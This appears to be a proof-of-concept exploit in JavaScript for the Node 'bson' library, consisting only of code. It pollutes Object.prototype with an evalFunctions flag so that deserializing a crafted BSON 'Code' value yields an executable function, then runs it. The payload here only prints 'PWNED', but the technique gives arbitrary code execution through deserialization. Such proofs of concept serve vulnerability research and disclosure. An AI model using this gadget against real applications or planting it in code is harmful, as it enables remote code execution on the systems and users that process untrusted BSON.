const BSON = require('bson');

const payload = BSON.serialize(
  { 
    func: {
      _bsontype: "Code",
      code: "console.log('PWNED')"
    }
  }
);

Object.prototype.evalFunctions = 1;

const result = BSON.deserialize(payload);
result.func();